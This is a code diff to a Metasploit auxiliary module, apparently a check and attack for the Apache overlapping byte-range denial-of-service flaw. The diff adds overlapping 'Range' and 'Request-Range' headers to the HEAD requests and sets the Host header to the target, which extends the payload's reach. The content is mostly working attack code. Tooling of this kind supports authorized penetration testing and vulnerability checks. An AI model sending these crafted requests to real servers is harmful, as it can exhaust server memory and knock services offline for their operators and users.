@@ -62,13 +62,15 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check_for_dos()
-    path = datastore['URI']
+    uri = datastore['URI']
+    rhost = datastore['RHOST']
     begin
       res = send_request_cgi({
-        'uri'     =>  path,
+        'uri'     =>  uri,
         'method'  => 'HEAD',
         'headers' => {
-          "HOST"          => "Localhost",
+          "HOST"  => rhost,
+          "Range" => "bytes=5-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9,10-10",
           "Request-Range" => "bytes=5-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9,10-10"
         }
       })
@@ -108,8 +110,9 @@ class MetasploitModule < Msf::Auxiliary
           'uri'     =>  uri,
           'method'  => 'HEAD',
           'headers' => {
-            "HOST" => rhost,
-            "Range" => "bytes=0-#{ranges}"}},1)
+            "HOST"  => rhost,
+            "Range" => "bytes=0-#{ranges}",
+            "Request-Range" => "bytes=0-#{ranges}"}},1)
 
       rescue ::Rex::ConnectionRefused
         print_error("Unable to connect to #{rhost}:#{rport}")
